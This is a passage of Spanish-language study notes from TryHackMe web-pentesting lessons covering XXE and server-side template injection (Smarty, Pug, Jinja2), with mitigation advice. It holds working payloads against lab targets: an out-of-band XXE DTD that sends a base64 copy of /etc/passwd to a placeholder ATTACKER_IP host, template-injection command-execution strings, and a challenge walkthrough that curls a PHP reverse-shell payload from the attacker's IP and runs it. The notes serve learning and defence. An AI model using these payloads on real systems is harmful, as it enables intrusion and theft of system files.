m√°ndalo.\n\n```xml\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://ATTACKER_IP:1337/\" >]>\n<upload><file>&xxe;</file></upload>\n```\n\nManda la petici√≥n modificada.\n\n![[Pasted image 20260112124634.png]]\n\nDespu√©s de mandar la petici√≥n HTTP modificada, el servidor Python recibir√° una conexi√≥n de la m√°quina v√≠ctima. El establecimiento de conexi√≥n con el servidor indica que la informaci√≥n sensible puede ser extra√≠da de la aplicaci√≥n.\n\n![[Pasted image 20260112124820.png]]\n\nAhora podemos crear un DTD que contenga una entidad externa con un filtro PHP para exfiltrar informaci√≥n de la aplicaci√≥n web.\n\nGuarda el ejemplo de DTD de abajo con el nombre `sample.dtd`. El payload de abajo exfiltrar√° los contenidos de `/etc/passwd` y mandar√° la respuesta a nuestro servidor:\n\n```xml\n<!ENTITY % cmd SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % oobxxe \"<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>\">\n%oobxxe;\n```\n\n<h4>Explicaci√≥n del DTD</h4>\nEl DTD comienza con una declaraci√≥n de una entidad `%cmd` que apunta a un recurso del sistema. La entidad `%cmd` refiere al recurso en el protocolo del filtro PHP `php://filter/convert.base64-encode/resource=/etc/passwd` devolviendo el contenido de `/etc/passwd`.El filtro `convert.base64-encode` encodea el contenido a base664 para evitar problemas de formato. La entidad `%oobxxe` contiene otra declaraci√≥n de entidad XML, `exfil`, la cual tiene un identificador de sistema apuntando al servidor controlado por el atacante. Incluye un par√°metro llamado `data` con `%cmd`, representando el contenido base64-encodeado de `/etc/passwd`. Cuando `%oobxxe;` se parsea, crea la entidad `exfil` que se conecta al servidor del atacante. El par√°metro `?data=%cmd` manda el contenido de `%cmd` encodeado en base64.\n\nVuelve al repetidor y cambia el payload a:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE upload SYSTEM \"http://ATTACKER_IP:1337/sample.dtd\">\n<upload>\n    <file>&exfil;</file>\n</upload>\n```\n\n![[Pasted image 20260112135242.png]]\n\nVuelve a mandar la petici√≥on y revissa tu terminal. Recibir√°s 2 peticiones. La primera es la petici√≥n del `sample.dtd` y la segunda es la petici√≥n mandada por la aplicaci√≥n vulnerable que contiene el `/etc/passwd` encodeado.\n\n![[Pasted image 20260112135344.png]]\n\nDecodificar la informaci√≥n exfiltrada de base64 mostrar√° el contenido de `/etc/passwd`.\n\n![[Pasted image 20260112135427.png]]",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "3. XML Parsing Mechanisms",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/3-xml-parsing-mechanisms/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/3. XML Parsing Mechanisms.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "<h2>Parsing XML</h2>\nEl parsing XML es el proceso por el cual un archivo XML es le√≠do y su informaci√≥n accedida y manipulada por un programa. Los parsers XML conviertan informaci√≥n de XML a una estructura que el programa pueda usar (como un √°rbol DOM). Durante este proceso, los parsers pueden validar la informaci√≥n XML contra un esquema o un DTD, asegurando que la estructura se ajusta a ciertas reglas.\n\nSi un parser se configura para procesar entidades externas, puede llevar a acceso no autprizado de archivos, sistemas o p√°ginas web.\n\n----------------------------------------\n<h2>Parsers XML Comunes</h2>\nSe usan m√∫ltiples parsers XML a trav√©s de diferentes entornos. Cada parser puede manejar la informaci√≥n XML de manera diferente.\n\n- **Parser DOM (Document Object Model):** Este m√©todo construye el documento XML entero en una estructura basada en arbol permitiendo acceso aleatorio a todas las partes del documento. Es intensivo de recursos pero muy flexible.\n- **Parser SAX (Simple API dor XML):** Parsea la informaci√≥n XML secuencialemente sin cargar el documento entero en memoriam haci√©ndolo adecuado para documentos XML grandes. Sin embargo, es menos flexible para acceder a la informaci√≥n XML.\n- **Parser StAX (Streaming API for XML):** Similar a SAX, StAX parsea el documento XML de una forma de cascada pero le da al programador m√°s contro, sobre el proceso de parseado.\n- **Parser XPath:** Parsea el documento XML basado en expresiones y se usa de forma extensiva junto a XSLT.",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "La inyecci√≥n de plantilla del lado del servidor, o SSTI, es una vulnerabilidad que ocurre cuando el input de un usuario se inyecta en el motor de plantilla de una aplicaci√≥n. Esto puede llevar a un amplio rango de reiesgos de seguridad incluyendo ejecuci√≥n de c√≥digo, exposici√≥n de informaci√≥n, escalada de privilegios, DoS, etc. Las vulnerabilidades SSTI se encuentran com√∫nmente en aplicaciones web que usan motores de plantillas para generar contenido din√°mico.\n\n--------------------------------------\n<h2>Objetivos</h2>\n1. Entender las funciones b√°sicas de motores de plantilla y por qu√© son integrales en las aplicaciones modernas.\n2. Identificar las vulnerabilidades en las aplicaciones web que pueden llevar a SSTI.\n3. Ejecutar ataques en diferentes motores de plantillas como Smarty (PHP), Jinja2 (Python), y Jade (NodeJS).\n4. Aplica las mejores pr√°cticas y estrategisa de mitigaci√≥n para prevenir SSTI en aplicaciones.\n\n--------------------------------------\n<h2>Pre-requisitos</h2>\n1. Conocimiento de la estructura HTML y c√≥mo se construyen las p√°ginas.\n2. Conocimiento b√°sico de scripting en JavaScript del lado del cliente.\n3. Familiaridad con conceptos de programaci√≥n con lenguajes del lado del servidor como PHP, Python, JavaScript, etc.",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "8. Extra-Mile Challenge",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/8-extra-mile-challenge/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/8. Extra-Mile Challenge.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "Hay una aplicaci√≥n web corriendo en `http://ssti.thm:8080/`. ¬øPuedes conseguir RCE y leer el contenido del archivo de texto escondido en el directorio usando SSTI?\n\nCredenciales de inicio de sesi√≥n:\n\n- **Username:** `admin`\n- **Password:** `admin`\n\n---------------------------------------------\n<h2>Challenge</h2>\n1. Vamos a la p√°gina que nos dan.\n   ![[Pasted image 20260113125257.png]]\n2. Iniciamos sesi√≥n con las credenciales que nos dan.\n   ![[Pasted image 20260113125332.png]]\n3. Haciendo click en \"FORM TOOLS\" podemos ver que existe de verdad.\n   ![[Pasted image 20260113130356.png]]\n   Y tambi√©n sabemos que la versi√≥n es la 3.1.1.\n   ![[Pasted image 20260113130429.png]]\n4. Buscando podemos encontrar que es vulnerable a RCE.\n   ![[Pasted image 20260113130637.png]]\n5. Probamos a ver d√≥nde meter el payload (probamos donde dice el exploit primero).\n\t1. Para ello vamos a crear una nueva Form (Internal).\n\t   ![[Pasted image 20260113131116.png]]\n\t2. En \"Views\" le damos a \"Add New Group\".\n\t   ![[Pasted image 20260113131256.png]]\n\t3. Si le damos a update eval√∫a la expresi√≥n.\n\t   ![[Pasted image 20260113131341.png]]\n\t4. Vamos a probar con `{system('ls')}`.\n\t   ![[Pasted image 20260113131609.png]]\n\t   ![[Pasted image 20260113131623.png]]\n\t   Est√° ejecutando los comandos. Vamos a mandarnos una reverse shell.\n6. Pegamos el payload en `payload.php`, por ejemplo.\n   ![[Pasted image 20260113132043.png]]\n7. Nos ponemos en escucha para servir el payload php.\n   ![[Pasted image 20260113131700.png]]\n8. Nos ponemos en escucha por el puerto que recibir√° la shell (`9000`).\n   ![[Pasted image 20260113132201.png]]\n9. Introducimos el payload en el campo: `{system('curl http://NUESTRA_IP:8081/payload.php -o /tmp/payload.php')}`.\n   ![[Pasted image 20260113132431.png]]\n10. Recibimos la petici√≥n y la m√°quina v√≠ctima se guarda el payload.\n    ![[Pasted image 20260113132924.png]]\n11. Introducimos el siguiente comando: `{system('php /tmp/payload.php')}`.\n    ![[Pasted image 20260113133128.png]]\n12. Recibimos la shell.\n    ![[Pasted image 20260113134046.png]]\n13. Obtenemos la flag.\n    ![[Pasted image 20260113134211.png]]",
    "modified": "2026-01-14T00:57:10"
  },
  {
    "title": "0. Server-Side Template Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/0-server-side-template-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/0. Server-Side Template Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/1. Introduction]]\n[[2. SSTI Overview]]\n[[3. Template Engines]]\n[[4. PHP - Smarty]]\n[[5. NodeJS - Pug]]\n[[6. Python - Jinja2]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/7. Automating the Exploitation]]\n[[8. Extra-Mile Challenge]]\n[[9. Mitigation]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. NodeJS - Pug",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/5-nodejs-pug/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/5. NodeJS - Pug.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "Pug (antes conocido como Jade) es un motor de plantillas de alto rendimiento ampliamente usado en la comunidad Node.js por su renderizado de HTML conciso y funcionalidades avanzadas como condicionales, iteraciones y herencia de plantilla. Aunque ofrece herramientas poderosas para desarrolladores, su habilidad para ejecutar c√≥digo JavaScript directamente en las plantillas puede suponer un riesgo importante.\n\nLas vulnerabilidades de seguridad de Pug principalmente salen de su capacidad de interpolar c√≥digo JavaScript en variables de plantilla. Esta funcionalidad, dise√±ada para generar contenido din√°micamente puede ser explotada de forma maliciosa si el input del usuariose incrusta en la plantilla sin sanitizar correctamente.\n\n<h4>Puntos Clave de Vulnerabilidades</h4>\n- **Interpolaci√≥n JavaScript:** Pug permite incrustar JS directamente en las plantillas usando `#{}`. Si el input del usuario se interpola sin sanitizaci√≥n adecuada puede llevar a ejecuci√≥n de c√≥digo arbitrario.\n- **Escapado por Defecto:** Pug ofrece un escapado autom√°tico para ciertos inputs, convirtiendo los caracteres como `<`, `>` y `&` a sus entidades HTML equivalentes para evitar ataques XSS. Sin embargo este comportamiento por defecto no cubre todos los problemas de seguridad, en particular al lidiar con interpolaci√≥n no escapada `!{}` o escenarios de input complejos.\n\n--------------------------------------------------\n<h2>Explotaci√≥n</h2>\nAntes de construir el payload es importante confirmar que la aplicaci√≥n usa Pug. Ve a `http://ssti.thm:8001/jade/`.\n\nInyecta una sintaxis b√°sica de Pug para comprobar el procesado de la plantilla, como `#{7*7}`. Si la aplicaci√≥n responde con 49, confirma que Pug est√° procesando la plantilla.\n\n![[Pasted image 20260113110259.png]]\n\nYa que Pug permite la interpolaci√≥n de JavaScrip, podemos usar el payload `#{root.process.mainModule.require('child_process').spawnSync(`ls`).stdout}`.\n\nEste, lo que har√° ser√° usar los m√≥dulos de Node.js para ejecutar comandos de sistema. Debajo est√° el an√°lisis del payload.\n\n- `root.process`: Accede al objeto global `process` de Node.js en la plantilla Pug.\n- `mainModule.require('child_process')`: Requiere el m√≥dulo `child_process` de manera din√°mica, bypasseando restricciones potenciales.\n- `spawnSync('ls')`: Ejecuta el comando `ls` de forma s√≠ncrona.\n- `.stdout`: Captura el output del comando.\n\n![[Pasted image 20260113110801.png]]\n\n-----------------------------------------------------------\n<h2>Por qu√© spawnSync('ls -lah') Puede No Funcionar</h2>\nCuando intentamos usar `spawnSync('ls -lah')`, estamos intentando pasar el comando entero y sus argumentos como una sola string. Esto no funciona porque `spawnSync` no separa la string en un comando y sus argumentos. En su lugar, lo trata todo como un comando a ejecutar.\n\nEste comportamiento es cr√≠tico para pervenir ciertos tipos de vulnerabilidades de seguridad. como la inyecci√≥n de comandos.\n\n-------------------------------------------------------\n<h2>Entendiendo el Uso de spawnSync</h2>\nLa funci√≥n `spawnSync` est√° dise√±ada para ejecutar un comando en la shell y dar control detallado sobre el input y output del comando. Es parte del m√≥dulo `child_process` de Node.js, lo que permite a Node.js ejecutar otros procesos en el sistema donde corre.\n\nLa firma de la funci√≥n para `spawnSync` es:\n\n```javascript\nspawnSync(command, [args], [options])\n```\n\n- **command:** Esto es una string que especifica el comando a ejecutar.\n- **args:** Es un array con los argumentos que pasarle al comando.\n- **options:** Es un par√°metro opcionar para especificar opciones como el directorio de trabajo, variables de entorno, timeout, etc.\n\n-----------------------------------------------\n<h2>Uso Correcto de spawnSync</h2>\nPara usar `spawnSync` correctamente para ejecutar el comando `ls` con el argumento `.lah`, deber√≠as separar el comando y sus argumentos en partes diferentes.\n\n```javascript\nconst { spawnSync } = require('child_process');\nconst result = spawnSync('ls', ['-lah']);\nconsole.log(result.stdout.toString());\n```\n\nDe esta forma corregida:\n\n- **'ls':** Es el comando.\n- **\\['-lah']:** Es un array que contiene todos los argumentos pasados al comando.\n\nEsta estructura asegura que el comando `ls` se llame con el argumento `-lah`, permitiendo al comando funcionar como se espera. Por lo que el payload final es:\n\n`#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}`\n\n![[Pasted image 20260113113014.png]]",
    "modified": "2026-01-14T00:57:10"
  },
  {
    "title": "6. Python - Jinja2",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/6-python-jinja2/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/6. Python - Jinja2.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "Jinja2 es un motor de plantilla popular para Python, reconocido por su flexibilidad y eficiencia. Es usado ampliamente en aplicaciones web para renderizar contenido din√°mico ya que permite incrustar expresiones \"como de Python\" en el HTML. Aunque Jinja2 acelera el desarrollo y facilita la separaci√≥n de la presentaci√±on de la l√≥gica de negocio, sus capacidades de plantillaje pueden introducir riesgos de seguridad importantes.\n\nComo permite la ejecuci√≥n de expresiones de Python en las plantillas, el riesgo de seguridad suele surgir de pr√°cticas de programaci√≥n inseguras que permiten al input del usuario ejecutarse en varias plantillas. La vulnerabilidad no es inherente de Jinja2 sino de c√≥mo los desarrolladores manejan el input en sus plantillas.\n\n<h4>Puntos Clave de Vulnerabilidad</h4>\n- **Evaluaci√≥n de Expresi√≥n:** Jinja2 eval√∫a expresiones con `{{ }}`, lo que puede ejecutar c√≥digo arbitrario Python si se construye maliciosamente.\n- **Herencia de Plantilla e Importes:** Las funcionalidades avanzadas como la herencia de plantilla y los importes macro pueden ser err√≥neamente utilizados para ejecutar c√≥digo que no deber√≠a.\n\n--------------------------------------\n<h2>Explotaci√≥n</h2>\nAntes de construir el payload, es crucial asegurarse de que la aplicaci√≥n usa Jinja2, por lo que iremos a `http://ssti.thm:8002/jinja2/` e introduciremos sintaxis de Jinja2 como `{{7*7}}` para comprobar el procesado. Si sale `49`, eso significa que es Jinja2.\n\n![[Pasted image 20260113121900.png]]\n\nUna vez confirmado el uso de Jinja2, podemos usar el payload `{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"ls\")}}`.\n\nDebajo una explicaci√≥n del payload:\n\n- `\"\".__class__.__mro[1]`: Accede a la clase del `object`, la superclase de todas las clases de Python.\n- `__subclasses__()`: Lista todas las subclases de `object` y `[157]` suele ser el √≠ndice para la clase `subprocess.Popen` (aunque este √≠ndice puede variar y deber√≠a ser comprobado en el entorno objetivo).\n  \n  ![[Pasted image 20260113122419.png]]\n  ![[Pasted image 20260113122426.png]]\n- El siguiente m√©todo encadena din√°micamente el importe y usa el m√≥dulo `subprocess` para ejecutar el comando `ls`, capturando su output.\n  \n  ![[Pasted image 20260113122652.png]]\n\n----------------------------------------\n<h2>Por qu√© check_output('ls -lah') No Funciona</h2>\nCuando usamos `check_output('ls -lah')`, estamos pasando un comando entero con sus argumentos como una string. Esta no es la manera recomendada de usar `check_output` porque no parsea la string en un comando y sus argumentos separados sino que trata todo como un comando entero.\n\nEste m√©todo de pasar los argumentos puede llevar a vulnerabilidades de inyecci√≥n en la shell si se concatenan cadenas de input de usuario directamente a la string de comandos. Requiriendo que los comandos y sus argumentos sean pasados como listas, `check_output` minimiza este riesgo.\n\n-----------------------------------\n<h2>Entendiendo el Uso de check_output</h2>\nLa funci√≥n `check_output` est√° dise√±ada para mejorar la seguridad separando el comando de sus argumentos, lo que ayuda a revenir ataques de inyecci√≥n shell. Aqu√≠ est√° la sintaxis general:\n\n```python\nsubprocess.check_output([command, arg1, arg2])\n```\n\n- **command:** String que especifica el comando a ejecutar.\n- **arg1, arg2,... :** Argumentos adicionales que deber√≠an ser pasados al comando.\n\n-------------------------------------------------\n<h2>Uso Correcto de check_output</h2>\nPara ejecutar el comando `ls` correctamente con opciones usando `check_output`, deber√≠amos pasarle el cmando y sus argumentos como elementos separados en una lista:\n\n```python\nsubprocess.check_output(['ls', '-lah'])\n```\n\nLa lista `['ls', '-lah']` contiene el comando `ls` y las opciones `-lah`. Que est√©n separados asegura que cada parte se maneja correctamente. Por lo que el payload final es:\n\n`{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(['ls', '-lah'])}}`\n\n![[Pasted image 20260113123648.png]]",
    "modified": "2026-01-14T00:57:10"
  },
  {
    "title": "9. Mitigation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/9-mitigation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/9. Mitigation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "La Server-Side Template Injection puede ser mitigada siguiendo un conjunto de buenas pr√°cticas e implementando medidas de seguridad en el c√≥digo de la aplicaci√≥n. Aqu√≠ est√° c√≥mo mitigar SSTI en Smarty, Jade y Jinja2:\n\n----------------------------------------\n<h2>Jinja2</h2>\n1. **Modo Snadbox:** Habilita el entorno sandboxeado en Jinja2 para restringir la habilidad de la plantilla para acceder a funciones y atributos inseguros. Esto previene la ejecuci√≥n arbitraria de c√≥digo.\n\n```python\nfrom jinja2 import Environment, select_autoescape, sandbox\n\nenv = Environment(\n    autoescape=select_autoescape(['html', 'xml']),\n    extensions=[sandbox.SandboxedEnvironment]\n)\n```\n\n2. **Sanitizaci√≥n de Input:** Sanitiza siempre el input para escapar o eliminar caracteres y strings potencialmente peligrosos que puedan ser interpretados como c√≥digo.\n3. **Auditor√≠a de plantilla:** Revisa y audita regularmente las plantilas en busca de patrones de c√≥digo inseguros, como directamente incrustar el input del usuario sin sanitizaci√≥n.\n\n--------------------------------------\n<h2>Jade(Pug)</h2>\n1. **Evita Evaluaci√≥n Directa de JavaScript:** Restringe o evita uar la habilidad de Pug para evaluar c√≥digo JavaScript en las plantillas. Usa m√©todos alternativos para manejar contenido din√°mico que no involucre ejecuci√≥n directa de c√≥digo:\n   \n```pug\nvar user = !{JSON.stringify(user)}\nh1= user.name\n```\n\nUsa `!{}` con cuidado ya que permite putput no escapado, lo que puede ser peligroso. Mejor usa `#{}` que si espaca HTML por defecto.\n\n2. **Valida y sanitiza los Inputs:** Aseg√∫rate de que todos los inputs del usuario sean validados contra el esquema estricto y sanitizados antes de que sean renderizados por el motor. Esto reduce el riesgo de ejecuci√≥n de c√≥digo arbitraria.\n3. **Ajusta la Configuraci√≥n para que sea Segura:** Usa configuraciones de entorno que minimicen riesgos, como deshabilitar funcionalidades que permitan la ejecuci√≥n del script.\n\n-----------------------------------------\n<h2>Smarty</h2>\n1. **Deshabilita las Etiquetas `{php}`:** Aseg√∫rate de que las etiquetas `{php}` est√©n deshabilitadas en la configuraci√≥n de Smarty para prevenir la ejecuci√≥n de PHP en las plantillas.\n\n```php\n$smarty->security_policy->php_handling = Smarty::PHP_REMOVE;\n$smarty->disable_security = false;\n```\n\n2. **Usa Manejadores Seguros:** Si debes permitir a los usuarios personalizar las plantillas, ofrece un conjunto de etiquetas o modificadores que puedan usar, lo que no permite la ejecui√±on directa de comandos o acceso a la shell.\n3. **Revisiones Regulares de Seguridad:** Realiza revisiones de seguridad de los archivos de plantillas y la l√≥gica de manejo de informaci√≥n para asegurar que no hay pr√°cticas inseguras. Actualiza Smarty regularmente.\n\n---------------------------------\n<h2>Sandboxing in Template Engines</h2>\nEs una funcionalidad de seguridad que restringe la ejecuci√≥n de c√≥digo potencialmente malicioso en las plantillas. Limita las acciones que pueden realizar estas como operaciones con archivos o ejecuci√≥n de comandos en el sistema. La debida sandboxing ayuda a prevenir problemas de seguridad.\n\n<h4>Importancia del Sandboxing</h4>\n- **Restricciones de Funciones:** Limita las funciones o m√©todos que pueden ser llamados desde la plantilla, bloqueando operaciones potencialmente peligrosas.\n- **Acceso a Variables e Informaci√≥n:** Controla el acceso a variables globales e informaci√≥n sensible, asegurando que las plantillas no pueden manipular o exponer la informaci√≥n cr√≠tica.",
    "modified": "2026-01-14T00:57:10"
  },
  {
    "title": "7. Automating the Exploitation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/7-automating-the-exploitation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/7. Automating the Exploitation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "`SSTImap` es una herramienta que automatiza el proceso de comprobar y explotar vulnerabilidades en varios motores de plantillas. Hosteada en [GitHub](https://github.com/vladko312/SSTImap), ofrece un framework para descubrir vulnerabilidades de inyecci√≥n en plantills.\n\nPara instalarla en tu m√°quina:\n\n```bash\ngit clone https://github.com/vladko312/SSTImap.git\ncd SSTImap\npip install -r requirements.txt\n```\n\nSTTImap es capaz de:\n\n- **Detectar Motor de Plantilla:** SSTImap puede ayudar a identificar el motor usado por una aplicaci√≥n web, la cual es crucial para construir exploits espec√≠ficos.\n- **Explotaci√≥n automatizada:** Para vulnerabilidades conocidas, SSSTImap puede automatizar el proceso de explotarlas.\n\nPuedes usar SSTImap d√°ndole la URL a escanear y cualquier opci√≥n necesaria, aqu√≠ un ejemplo de uso:\n\n```bash\npython3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='\n```\n\nEste comando intenta detectar vulnerabilidades SSTI usando los payloads preparados.\n\n```bash\nuser@tryhackme $ python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='           \n\n    ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï¶‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï¶‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó ‚ñÄ‚ñà‚ñÄ\n    ‚ïë ‚ïî‚ïê‚ïê‚ïê‚ïê‚ï£ ‚ïî‚ïê‚ïê‚ïê‚ïê‚ï©‚ïê‚ïê‚ïó ‚ïî‚ïê‚ïê‚ïù‚ïê‚ïó‚ñÄ‚ïî‚ïê\n    ‚ïë ‚ïö‚ïê‚ïê‚ïê‚ïê‚ï£ ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïó  ‚ïë ‚ïë    ‚ïë{‚ïë  _ __ ___   __ _ _ __\n    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïó ‚ï†‚ïê‚ïê‚ïê‚ïê‚ïó ‚ïë  ‚ïë ‚ïë    ‚ïë*‚ïë | '_ ` _ \\ / _` | '_ \\\n    ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù ‚ï†‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïë  ‚ïë ‚ïë    ‚ïë}‚ïë | | | | | | (_| | |_) |\n    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï©‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïù    ‚ïö‚ï¶‚ïù |_| |_| |_|\\__,_| .__/\n                             ‚îÇ                  | |\n                                                |_|\n[*] Version: 1.2.1\n[*] Author: @vladko312\n[*] Based on Tplmap\n[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.\nIt is the end user's responsibility to obey all applicable local, state and federal laws.\nDevelopers assume no liability and are not responsible for any misuse or damage caused by this program\n[*] Loaded plugins by categories: languages: 5; generic: 3; engines: 17; legacy_engines: 2\n[*] Loaded request body types: 4\n\n[*] Scanning url: http://ssti.thm:8002/mako/\n[*] Testing if Body parameter 'page' is injectable\n[*] Mako plugin is testing rendering with tag '*'\n[+] Mako plugin has confirmed injection with tag '*'\n[+] SSTImap identified the following injection point:\n\n  Body parameter: page\n  Engine: Mako\n  Injection: *\n  Context: text\n  OS: posix-linux\n  Technique: render\n  Capabilities:\n\n    Shell command execution: ok\n    Bind and reverse shell: ok\n    File write: ok\n    File read: ok\n    Code evaluation: ok, python code\n```",
    "modified": "2026-01-14T00:57:10"
  },
  {
    "title": "3. Template Engines",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/4-server-side-template-injection/3-template-engines/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/4. Server-Side Template Injection/3. Template Engines.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 4. Server-Side Template Injection",
    "content": "Un motor de plantillas es como una m√°quina que te ayuda a construir p√°ginas web de manera din√°mica. Aqu√≠ est√° c√≥mo funciona en t√©rminos simples:\n\nImagina que quieres regalarle una carta de cumplea√±os a tu amigo. En lugar de hacer una desde cero puedes usar una plantilla con placeholders en el nombre, edad, etc.\n\nUn motor de plantillas funciona similar:\n\n1. **Plantilla:** El motor usa una plantilla predise√±ada con placeholders como `{{ name }}` para el contenido din√°mico.\n2. **Input del Usuario:** El motor recibe el input del usuario (como nombre, edad o mensaje) y lo guarda en una variable.\n3. **Combinaci√≥n:** El motor combina la plantilla con el input del usuario, reemplazando los placeholders con informaci√≥n real.\n4. **Output:** El motor genera una p√°gina web final din√°mica con el input del usuario insertado.\n\nLos motores de plantillas ofrecen varias funcionalidades que aceleran el proceso de desarrollo pero que tambi√©n pueden introducir riesgos. La mayor√≠a de motores permiten usar expresiones para c√°lculos o l√≥gica simple en las plantillas. En el contexto de SSTI la habilidad de la plantilla de ejecutar c√≥digo es lo que la hace vulnerable a los ataques.\n\n--------------------------------------------------\n<h2>Motores de Plantillas Comunes</h2>\nLos motores de plantillas son una parte integral del desarrollo web moderno, permitiendo a los desarrolladores generar contenido HTML din√°mico combinando plantillas con datos. Aqu√≠ algunos de los motores m√°s usados:\n\n- **Jinja2:** Altamente popular en aplicaciones Python, conocido por su expresividad y poderosas capacidades de renderizado.\n- **Twig:** El motor de plantilla por defecto para Simfony en PHP. Ofrece un entorno robusto con configuraci√≥n por defecto segura.\n- **Pug/Jade:** Conocido por su sintaxis de plantilla HTML minimalista y limpia, popular entre desarrolladores Node.js.\n\n-----------------------------------------\n<h2>C√≥mo Parsean y Procesan Inputs los Motores de Plantillas</h2>\nLos motores de plantillas funcionan parseando archivos de plantillas, que contienen contenido est√°tico mezclado con una sintaxis especial para el contenido din√°mico. Cuando renderizamos una plantilla, el motor cambia las partes din√°micas con la informaci√≥n proporcionada en tiempo de ejecuci√≥n. Por ejemplo:\n\n```python\nfrom jinja2 import Template\n\nhello_template = Template(\"Hello, {{ name }}!\")\noutput = hello_template.render(name=\"World\")\nprint(output)\n```\n\nEn este ejemplo, `{{ name }}` es un placeholder que se reemplaza con el valor `\"World\"` durante el renderizado.\n\n-----------------------------------------\n<h2>Determinando el Motor de Plantillas</h2>\nLos diferentes motores tienen distintas sintaxis y funcionalidades, haci√©ndolos vulnerables a SSTI de varias maneras. Aqu√≠ hay algunos ejemplos de sintaxis de plantillas vulnerables.\n\n<h4>Jinja2/Twig</h4>\nJinja2 y Twig son similares en sintaxis y comportamiento, haci√©ndolos dif√≠cil de distinguir uno de otro s√≥lo mediante respuestas de payload. Sin embargo, puedes detectar su presencia comprobando sus capacidades de manejo de expresiones. Por ejemplo, usando 